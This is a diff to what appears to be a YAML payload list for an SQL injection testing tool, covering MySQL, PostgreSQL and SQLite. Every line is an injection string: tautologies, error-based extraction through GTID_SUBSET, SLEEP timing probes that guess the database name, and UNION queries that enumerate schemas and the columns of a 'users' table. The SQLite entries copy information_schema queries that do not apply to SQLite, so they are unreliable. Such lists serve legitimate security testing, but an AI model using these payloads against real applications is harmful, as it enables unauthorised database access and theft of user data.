@@ -1,15 +1,33 @@
 mysql:
   blind:
-  - "' OR '1"
   - "1' OR '1"
+  error:
+  - "1' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- - "
+  time:
+  - "1' OR IF(1=1, SLEEP(3), 0) -- "
+  condition:
+  - "1' AND IF (length(database())=7, SLEEP (3), 1) -- " # correct sleep3
+  - "1' AND IF (SUBSTRING(database(),1,1)='a', SLEEP (3), 1) -- " ## Not correct no sleep
   union:
-  - "1' AND 1=2 UNION SELECT * FROM users --"
-  - "1' UNION SELECT table_schema, table_name FROM  information_schema.columns WHERE table_schema != 'mysql' AND table_schema !=  'information_schema' --"
+  # Get All dabatase schema
+  - "1 UNION SELECT table_schema, table_name FROM information_schema.tables -- "
+  # Get information of user Table
+  - "1' UNION SELECT column_name, data_type FROM  information_schema.columns WHERE table_name = 'users' -- "
 
 pgsql:
   blind:
-  - "' OR '1"
   - "1' OR '1"
   union:
-  - "1' AND 1=2 UNION SELECT * FROM users --"
+  # Get database tables
   - "1' UNION SELECT table_schema, table_name FROM  information_schema.columns WHERE table_schema != 'mysql' AND table_schema !=  'information_schema' --"
+  # Get information of user Table
+  - "1' UNION SELECT column_name, data_type FROM  information_schema.columns WHERE table_name = 'users' --"
+
+sqlite:
+  blind:
+  - "1' OR '1"
+  union:
+  # Get database tables
+  - "1' UNION SELECT table_schema, table_name FROM  information_schema.columns WHERE table_schema != 'mysql' AND table_schema !=  'information_schema' --"
+  # Get information of user Table
+  - "1' UNION SELECT column_name, data_type FROM  information_schema.columns WHERE table_name = 'users' --"
